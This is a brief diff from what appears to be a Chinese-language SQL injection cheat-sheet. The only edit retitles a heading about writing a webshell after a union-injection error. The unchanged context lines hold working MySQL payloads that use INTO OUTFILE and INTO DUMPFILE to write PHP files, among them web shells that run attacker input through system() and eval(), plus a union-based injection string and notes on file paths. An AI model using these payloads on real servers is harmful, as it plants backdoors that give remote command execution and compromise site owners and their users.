@@ -103,7 +103,7 @@ select "<?php phpinfo(); ?>" into dumpfile '/var/www/html/phpinfo.php';
 文本格式写
 select '<?php system($_GET[1]); ?>' into outfile 'c:\\phpstudy\\PHPTutorial\\WWW\\gg.php';
 
-写webshell文件：
+联合注入前报错后写webshell文件：
 写入文件路径为相对路径时，默认写入到数据库所在文件夹中
 1111111'union select 1,2,"<?php @eval($_GET['string'])?>" into outfile "1.php" --+
 也可以写成绝对路径，此处为Windows的路径
